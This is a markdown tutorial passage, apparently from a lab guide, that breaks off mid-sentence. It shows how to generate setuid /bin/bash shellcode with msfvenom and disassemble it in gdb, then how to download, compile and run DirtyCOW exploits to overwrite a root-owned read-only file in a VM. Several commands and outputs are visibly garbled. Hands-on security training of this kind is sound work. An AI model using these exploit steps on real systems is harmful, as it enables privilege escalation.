  md: '# Convert shellcode to assembly


    More often than not you will be using an exploit coded by someone else. This exploit
    could contain shellcode. You need to understand the shellcode before running it!
    Go to Kali Linux and generate this new shellcode in C format:


    ```

    msfvenom -p linux/x86/exec -a x86 CMD=/bin/bash

    PrependSetuid=True -f c > myshell

    ```


    Now open your favourite ASCII editor and create a new C source file. Write this
    down (replace the placeholder with the output of the previous command):


    ```

    #include <stdio.h>

    <FAST_THE_SHELL_CODE_HERE>

    void main(int argc, char **argv) { }

    ```


    Save it as exploit.c. Compile it and then open the binary within a gdb session:


    ```

    gcc exploit.c -o exploit

    gdb -q exploit

    ```


    The shellcode will be located at the address pointed to by buf(). Use the disassemble
    command in gdb with this particular address to obtain the exploit code:


    ```

    (gdb) disas 8&uf

    0x0804-8040   <+0> : xor %ebx, %ebx

    0x0804-8042   <+2> : push $0x17

    0x0804-8044   <+4> : pop %eax

    0x0804-8045   <+5> : int $0x80

    ```


    Because &buf points to a bunch of op-codes, gdb has no trouble at all in disassembling
    them!


    # Overwrite files with DirtyCOW


    DirtyCOW is a kernel race condition bug that allows any non-privileged user to
    write to any read-only file (even those that belong to other users, such as root).
    Therefore, it can lead to privilege escalation by overwriting SUID root binaries.
    WebSecurity Dojo 2.0 is vulnerable to DirtyCOW. Let’s play with this bug: download
    your first exploit using WebSecurity Dojo:


    ```

    wget --no-check-certificate https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtycow.c

    ```


    This exploit has been coded in C, therefore you have to compile it:


    ```

    gcc dirtycow.c -o dirtycow -pthread

    ```


    Now, take a snapshot of your VM before executing the exploit by pressing right-CTRL+T;
    this way, if something goes wrong, you will be able to recover the previous VM
    state. This PoC will allow you to write a string to a file owned by root for which
    you have read-only permission. First, create the file and put some text in it:


    ```

    sudo echo "Root file" > test

    sudo chmod 0404 test

    ```


    Now, run the exploit:


    ```

    ./dirtycow test "HELLO"

    ...

    process1mem -100000000

    ```


    If you read the file again, you will see that the exploit has failed. Indeed,
    the contents of test have not been altered at all. The exploit output itself pinpoints
    where the error could be: process1mem -100000000. Using your favourite ASCII editor,
    open the exploit source code and look for the process1mem string. The code belongs
    to one of the two threads of the exploit: processFimemThread:


    ```

    1 for(i=0;i<100000000;i++){

    2  seekf((uintptr_t) map,SEEK_SET);

    3  c+=write(f,str,strlen(str));

    4  } printf("process1mem %d\n", c);

    ```


    The idea behind DirtyCOW is to trigger a race condition between two threads: one
    calling madvise() and the other writing over and over to the file mapped into
    the process address space using /proc/self/mem. As the previous output implies,
    a negative number means that every single call to the write function has failed
    (line 3). In other words, you are not allowed to write to /proc/self/mem, apparently.
    However, there is another way to write to a process address space: enter trace().
    Now let’s try the second PoC; download it first:


    ```

    wget --no-check-certificate https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c

    ```


    > You need to analyse what the exploit really does and execute it in a controlled
    environment (VM).


    Compile it:


    ```

    gcc -pthread pokemon.c -o pokemon

    ```


    Try to overwrite test once again:


    ```

    ./pokemon test HELLO

    ```


    Finally, read the test file and be amazed:


    ```

    cat test

    HELLOfile

    ```


    This time it has worked, but why? We were not able to write to /proc/self/mem
    directly, so the new exploit uses a call to ptrace() to achieve the same goal.
    Instead of having a second thread


